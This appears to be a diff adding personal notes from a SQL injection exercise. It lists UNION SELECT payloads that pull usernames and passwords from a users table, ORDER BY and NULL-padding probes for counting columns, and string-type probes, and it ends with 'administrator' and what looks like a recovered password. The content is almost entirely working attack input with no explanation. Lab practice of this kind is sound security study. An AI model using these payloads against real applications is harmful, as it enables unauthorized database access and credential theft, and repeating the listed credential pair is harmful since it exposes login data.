@@ -1,0 +1,22 @@
+
+' UNION SELECT username, password FROM users--
+
+' UNION SELECT username, password, NULL FROM users--
+
+
+' ORDER BY 1--
+' ORDER BY 2--
+
+
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc.
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+
+
+administrator
+bp35su43ipl16urj046i
